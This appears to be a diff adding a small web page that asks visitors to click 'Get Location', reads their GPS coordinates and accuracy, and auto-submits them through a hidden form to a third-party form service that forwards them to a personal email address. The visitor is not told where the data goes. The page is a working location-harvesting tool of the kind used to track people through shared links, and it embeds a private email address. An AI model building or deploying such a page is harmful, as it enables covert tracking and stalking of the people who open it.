@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GPS Location</title>
+
+<style>
+body {
+    background: #0f172a;
+    color: white;
+    text-align: center;
+    font-family: Arial, sans-serif;
+    padding: 30px;
+}
+button {
+    padding: 12px 20px;
+    font-size: 16px;
+    border: none;
+    border-radius: 8px;
+    background: #22c55e;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<h2>📍 Get My Location</h2>
+<p>Click to send GPS location</p>
+
+<button onclick="getLocation()">Get Location</button>
+
+<p id="status"></p>
+
+<!-- HIDDEN FORM -->
+<form id="gpsForm" action="https://formsubmit.co/delfinadodennis26@gmail.com" method="POST">
+    <input type="hidden" name="Latitude" id="lat">
+    <input type="hidden" name="Longitude" id="lon">
+    <input type="hidden" name="Accuracy" id="acc">
+
+    <!-- OPTIONAL -->
+    <input type="hidden" name="_subject" value="📍 New GPS Location">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
+</form>
+
+<script>
+function getLocation() {
+    document.getElementById("status").innerHTML = "📡 Getting location...";
+
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            document.getElementById("lat").value = position.coords.latitude;
+            document.getElementById("lon").value = position.coords.longitude;
+            document.getElementById("acc").value = position.coords.accuracy + " meters";
+
+            document.getElementById("status").innerHTML = "✅ Location sent!";
+            document.getElementById("gpsForm").submit();
+        },
+        function() {
+            document.getElementById("status").innerHTML = "❌ Permission denied.";
+        }
+    );
+}
+</script>
+
+</body>
+</html>
